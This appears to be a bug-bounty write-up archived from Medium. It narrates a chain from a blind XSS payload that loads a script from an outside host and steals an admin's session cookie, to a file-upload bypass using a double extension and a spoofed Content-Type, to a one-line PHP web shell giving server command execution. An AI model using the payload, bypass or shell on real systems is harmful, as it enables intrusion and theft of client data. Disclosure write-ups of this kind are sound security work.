# From Blind XSS to Full Server Takeover

- **Source URL:** https://medium.com/@0xnuy/from-blind-xss-to-full-server-takeover-0f63ead701ab?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@0xnuy
- **Fetched:** 2026-11-17
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 9173)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**السَّلامُ عَلَيْكُم ورَحْمَةُ اللهِ وَبَرَكاتُه**

I have discovered an **RCE** in admin panel :

It all started with a simple form — just another boring training portal connected to an admin panel. I dropped a classic Blind XSS payload (\<script src=//xss.report/hook.js>\</script>) and waited.

Hours later, my XSS Hunter fired. **An admin had taken the bait.**

The payload delivered everything:

- Their **session cookies** (PHPSESSID=…).
- Their **IP and user-agent**.
- A full view of the admin panel — **client names, reservations, everything.**

I hijacked the session. Suddenly, I was **inside the admin panel,** (no password needed).

### The Upload That Broke Everything

Inside the admin dashboard, I found a file upload page (/downloads.php). It claimed to only accept PDFs. **But claims are cheap.**

I tried uploading a PHP shell. The frontend blocked me — **“Only PDFs allowed!”**

So I fired up **Burp Suite**, intercepted the request, and did the usual tricks:

- Renamed shell.php to shell.pdf.php.
- Spoofed the Content-Type to application/pdf.

**The server swallowed it whole.**

A few seconds later, my shell was live:

\<?php system($\_GET\['cmd'\]); ?>

I hit it with ?cmd=id—**boom.** Server access confirmed.

### The Aftermath: Total Control

With RCE, I had **the keys to the kingdom**:

- **Internal files** — other websites hosted on the same server.
- **Client databases** — names, emails, reservations.
- **Email hijacking** — I could send “official” emails to users, complete with malware attachments.

The worst part? **No zero-days, no fancy exploits.** Just **basic security failures** chained together.

### The Lesson

This wasn’t hacking. **This was walking through open doors.**

A **Blind XSS** led to **admin theft**, which led to **file upload bypass**, which led to **full server takeover.**

The scariest part? **It’s all preventable.**

أستودعكم الله الذي لاتضيع ودائعه

— — — — — — — — — — — — — — — — — — — — — — — — — — — —

- **X (Twitter):** [@0xnuy](https://x.com/0xnuy)

[From Blind XSS to Full Server Takeover](https://osintteam.blog/from-blind-xss-to-full-server-takeover-0f63ead701ab) was originally published in [OSINT Team](https://osintteam.blog) on Medium, where people are continuing the conversation by highlighting and responding to this story.
